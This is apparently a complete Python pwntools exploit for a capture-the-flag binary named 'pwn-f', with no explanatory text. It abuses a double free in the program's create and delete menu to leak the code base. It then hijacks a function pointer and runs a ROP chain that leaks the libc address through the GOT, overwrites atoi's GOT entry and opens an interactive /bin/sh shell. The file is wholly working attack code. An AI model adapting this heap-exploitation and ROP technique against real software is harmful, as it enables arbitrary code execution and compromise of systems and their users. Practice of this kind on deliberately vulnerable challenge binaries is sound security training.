#! /usr/bin/python
from pwn import *

context.log_level = 'debug'
target = process('pwn-f')

def create(size, string):
    target.recvuntil('quit')
    target.sendline('create ')
    target.recvuntil('size:')
    target.sendline(str(size))
    target.recvuntil('str:')
    target.send(string)


def delete(id):
    target.recvuntil('quit')
    target.sendline('delete ')
    target.recvuntil('id:')
    target.sendline(str(id))
    target.recvuntil('sure?:')
    target.sendline('yes')

create(4, 'aaa\n')
create(4, 'aaa\n')
delete(0)
delete(1)
delete(0)
create(4, '\x00')
create(0x20, 'a' * 0x16 + 'lo' + '\x2d\x00')
delete(0)

target.recvuntil('lo')
addr = target.recvline()
addr = addr[:-1]
addr = u64(addr + '\x00' * (8 - len(addr))) - 0xd2d

delete(1)

create(4, '\x00')

target.recvuntil('quit')
target.sendline('create ')
target.recvuntil('size:')
target.sendline(str(0x20))
target.recvuntil('str:')
target.send('a' * 0x18 + p64(0x00000000000011DC + addr))

print hex(addr)

target.recvuntil('quit')
target.sendline('delete ')
target.recvuntil('id:')
target.sendline('1')
target.recvuntil('sure?:')

ropchain = p64(addr + 0x00000000000011e3)   # pop rdi
ropchain += p64(addr + 0x202070)            # got@malloc
ropchain += p64(addr + 0x0000000000000990)  # plt@put

ropchain += p64(addr + 0x00000000000011e3)  # pop rdi
ropchain += p64(1)
ropchain += p64(addr + 0x00000000000011DA)  # magic
ropchain += p64(0)                          # rbx
ropchain += p64(1)                          # rbp
ropchain += p64(addr + 0x0000000000202058)  # r12 -> rip got@read
ropchain += p64(8)                          # r13 -> rdx
ropchain += p64(addr + 0x0000000000202078)  # r14 -> rsi got@atoi
ropchain += p64(0)                          # r15 -> rdi
ropchain += p64(addr + 0x00000000000011C0)  # magic
ropchain += 'a'*8*7

ropchain += p64(addr + 0x0000000000000B65)  # getInt

target.sendline('yes     ' + ropchain)
addr = target.recvline()[:-1]
addr = u64(addr + '\x00' * (8 - len(addr)))
#addr = addr - 534112 + 288144
addr = addr - 537984 + 283536
print hex(addr)
target.sendline(p64(addr)+'/bin/sh')
target.interactive()
